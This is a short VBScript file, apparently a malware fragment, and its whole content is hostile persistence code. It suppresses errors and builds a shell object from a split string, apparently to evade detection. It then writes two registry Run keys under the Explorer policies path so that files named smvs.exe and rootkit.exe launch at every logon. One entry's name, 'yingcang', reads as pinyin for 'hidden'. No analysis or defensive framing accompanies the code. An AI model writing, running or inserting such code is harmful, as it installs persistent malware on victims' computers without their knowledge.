on error resume next

regruns()
Sub regruns()
On Error Resume Next
set a=createobject("wsc"&"ript.shell")
a.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\smvs1", dir1&"C:\windows\system32\smvs.exe"
a.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\yingcang1", dir1&"C:\WINDOWS\rootkit.exe"
End sub
